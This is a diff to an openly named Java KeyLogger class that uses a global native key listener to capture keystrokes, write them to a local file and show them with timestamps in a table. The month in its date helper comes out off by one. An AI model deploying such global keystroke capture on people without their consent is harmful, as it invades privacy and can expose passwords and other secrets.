@@ -10,10 +10,17 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.Calendar;
 
 
 public class KeyLogger implements NativeKeyListener {
     private HelloApplication helloApplication;
+    private TimeSheetController timeSheetController;
+
+
+
     private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");
 
     private static String log = "";
@@ -21,6 +28,10 @@ public class KeyLogger implements NativeKeyListener {
 
     public void setHelloApplication(HelloApplication helloApplication) {
         this.helloApplication = helloApplication;
+    }
+
+    public void setTimeSheetController(TimeSheetController timeSheetController){
+        this.timeSheetController = timeSheetController;
     }
 
     private OutputStream os;
@@ -78,14 +89,28 @@ public class KeyLogger implements NativeKeyListener {
 
         if (keyText.length() > 1) {
             log = log + "[" + keyText + "]";
+            timeSheetController.addTable(new Info(getDate(),"[" + keyText + "]", getTime()));
             //writer.print("[" + keyText + "]");
-
         } else {
             log = log + keyText;
+           timeSheetController.addTable(new Info(getDate(),keyText, getTime()));
             //writer.print(keyText);
         }
     }
+    private String getTime() {
+        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH:mm:ss");
+        LocalDateTime now = LocalDateTime.now();
+        return dtf.format(now);
+    }
+    private String getDate() {
+        Calendar calendar = Calendar.getInstance();
+        int dayToday = calendar.get(Calendar.DAY_OF_MONTH);
+        int monthToday = calendar.get(Calendar.MONTH);
+        int yearToday = calendar.get(Calendar.YEAR);
 
+        String ret = dayToday + "_" + monthToday + "_" + yearToday;
+        return ret;
+    }
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
 
